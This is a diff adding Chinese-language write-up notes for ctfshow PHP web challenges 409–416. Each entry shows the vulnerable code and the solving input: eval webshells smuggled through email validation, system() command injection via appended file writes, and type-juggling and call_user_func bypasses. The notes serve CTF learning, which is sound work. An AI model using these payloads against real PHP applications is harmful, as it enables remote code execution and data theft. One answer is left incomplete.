@@ -1,6 +1,6 @@
 ﻿---
 title: "搭建服务器"
-lastmod: 2026-06-02T22:23:31+08:00
+lastmod: 2026-06-07T23:59:38+08:00
 draft: false
 ---
 ```bash
@@ -3264,5 +3264,124 @@ filter_var ($email,FILTER_VALIDATE_EMAIL)
 GET：
 而且有空格格式就不对所以小马得这么写
 `?email="<?=eval($_POST[1])?>"@1.php`
-
+## 409
+```php
+<?php  
+highlight_file(__FILE__);  
+error_reporting(0);  
+$email=$_GET['email'];  
+if(filter_var ($email,FILTER_VALIDATE_EMAIL)){    $email=preg_replace('/.flag/', '', $email);  
+    eval($email);  
+}
+```
+这里.flag代表的是删除任意一个字符加上flag，所以这里会把"flag都删除掉
+```
+"flageval($_POST[a]);?>"@123.com
+```
+这样子的话京故宫删除就是`eval(eval($_POST[a]);?>)`
+## 410
+```php
+<?php  
+highlight_file(__FILE__);  
+error_reporting(0);  
+include('flag.php');  
+$b=$_GET['b'];  
+if(filter_var ($b,FILTER_VALIDATE_BOOLEAN)){  
+    if($b=='true' || intval($b)>0){  
+        die('FLAG NOT HERE');  
+    }else{  
+        echo $flag;  
+    }  
+}
+```
+filter_var ($b,FILTER_VALIDATE_BOOLEAN)函数特性
+如果是 "1", "true", "on" 以及 "yes"，则返回 true。
+如果是 "0", "false", "off", "no" 以及 ""，则返回 false。
+否则返回 NULL。
+所以直接?
+## 411
+和上面一道题目类似
+?b=yes
+## 412
+```php
+<?php  
+highlight_file(__FILE__);    
+$ctfshow=$_POST['ctfshow'];  
+if(isset($ctfshow)){
+    file_put_contents('flag.php', '//'.$ctfshow,FILE_APPEND);  
+    include('flag.php');  
+}
+```
+这个直接写`ctfshow=%0asystem('tac f*');`
+这里是通过换行将代码写入下一行
+然后执行flag.php
+所以你可以直接写入代码，可以直接看flag
+## 413
+```php
+<?php  
+highlight_file(__FILE__);  
+$ctfshow=$_POST['ctfshow'];  
+if(isset($ctfshow)){
+    file_put_contents('flag.php', '/*'.$ctfshow.'*/',FILE_APPEND);  
+    include('flag.php');  
+}
+```
+这个好像直接`/**/`合并就能绕过
+`ctfshow=*/system("cat flag.php");/*`
+## 414
+```php
+<?php  
+highlight_file(__FILE__);  
+include('flag.php');  
+$ctfshow=$_GET['ctfshow'];    
+if($ctfshow==true){  
+    if(sqrt($ctfshow)>=sqrt(intval($flag))){  
+        echo 'FLAG_NOT_HERE';  
+    }else{  
+        echo $flag;  
+    }  
+}
+```
+- `intval($flag)` 会把 flag 字符串转成 0
+- `sqrt()` 对负数返回 NaN
+- NaN 与任何数字比较都是 false![[==.png]]
+## 415
+```php
+<?php   
+error_reporting(0);  
+highlight_file(__FILE__);  
+$k = $_GET[k];  
+function getflag(){  
+    echo file_get_contents('flag.php');  
+}  
+if($k=='getflag'){  
+    die('FLAG_NOT_HERE');  
+}else{
+    call_user_func($k);  
+}
+```
+在老版本的php中，call_user_func不会对比大小写，所以其实可以直接getFlag就可以绕过
+## 416
+```php
+<?php    
+error_reporting(0);  
+highlight_file(__FILE__);  
+class ctf{  
+    public function getflag(){  
+        return 'fake flag';  
+    }  
+    final public function flag(){  
+        echo file_get_contents('flag.php');  
+    }  
+}  
+class show extends ctf{  
+    public function __construct($f){
+            call_user_func($f);  
+    }  
+}  
+echo new show($_GET[f]);
+```
+ctf::flag可以直接通过call_user_func调用一个class里的函数
+其实直接调用ctf::flag也能达到同样的效果
+所以这道题目直接输出结果就行
 
